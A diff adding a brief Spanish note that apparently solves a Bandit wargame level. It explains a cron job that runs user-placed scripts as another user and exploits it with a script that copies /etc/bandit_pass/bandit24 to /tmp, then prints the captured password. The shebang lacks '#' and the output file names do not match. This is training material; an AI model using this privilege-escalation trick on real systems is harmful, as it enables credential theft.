@@ -1,0 +1,30 @@
+# Este nivel me pide crear un script. La cosa es que el cron ejecuta cada minuto todos los scripts en una carpeta
+!/bin/bash
+
+myname=$(whoami)  # obtiene el nombre del usuario (en este caso, "bandit24")
+
+cd /var/spool/$myname/foo  # entra a /var/spool/bandit24/foo
+
+for i in * .*; do
+  if [ "$i" != "." -a "$i" != ".." ]; then
+    owner="$(stat --format "%U" ./$i)"  # verifica el propietario del archivo
+    if [ "${owner}" = "bandit23" ]; then
+      timeout -s 9 60 ./$i  # ejecuta tu script como bandit24 por hasta 60 segundos
+    fi
+    rm -f ./$i  # borra el script
+  fi
+done
+
+# La cosa esta en que existe la carpeta bandit24 pero la carpeta foo no podes ingresar
+# Entonces tenes que crear el archivo en otro lado, darle los permisos de ejecucion 
+# y luego pasarlo con mv a esa carpeta (curiosamente te deja por tiene de ejecucion)
+
+$ nano /tmp/kali_23
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt
+
+$ chmod +x /tmp/kali_23
+$ mv /tmp/kali_23 ./foo/
+$ cat /tmp/bandit24_pass
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
